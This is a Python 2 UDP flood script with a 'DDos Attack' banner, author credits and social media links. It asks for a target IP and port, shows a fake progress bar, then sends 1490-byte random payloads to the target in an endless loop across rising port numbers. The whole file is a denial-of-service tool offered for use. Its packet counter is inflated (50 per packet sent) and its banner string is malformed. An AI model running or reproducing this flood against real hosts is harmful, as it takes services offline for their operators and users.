import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print 
"DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS                  XXXXXXX       XXXXXXX
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S                 X:::::X       X:::::X
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S                 X:::::X       X:::::X
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS                 X::::::X     X::::::X
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S                             XXX:::::X   X:::::XXX
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S                                X:::::X X:::::X   
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS                              X:::::X:::::X    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS     ---------------      X:::::::::X     
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS   -:::::::::::::-      X:::::::::X     
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S  ---------------     X:::::X:::::X    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S                    X:::::X X:::::X   
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S                 XXX:::::X   X:::::XXX
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S                 X::::::X     X::::::X
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S                 X:::::X       X:::::X
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS                  X:::::X       X:::::X
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS                    XXXXXXX       XXXXXXX
"
print "Author   : esam alian"
print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222"
print
ip = raw_input("IP server : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 50
     port = port + 10
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 90000:
       port = 1
